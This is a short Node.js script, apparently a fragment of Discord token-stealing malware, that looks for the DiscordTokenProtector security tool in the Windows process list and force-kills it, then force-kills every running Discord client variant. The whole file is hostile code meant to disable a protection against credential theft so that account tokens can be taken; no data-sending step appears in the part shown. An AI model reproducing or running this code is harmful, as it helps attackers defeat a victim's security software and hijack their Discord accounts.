const { exec, execSync } = require('child_process');

const tasks = execSync('tasklist');
const dtp = tasks.includes('DiscordTokenProtector.exe');
// There's a DTP process, kill it
if (dtp) exec('taskkill /f /im DiscordTokenProtector.exe');

// Kills every version of Discord running
['discord', 'discordcanary', 'discorddevelopment', 'discordptb'].forEach(app => {
  exec(`taskkill /f /im ${app}.exe`);
});
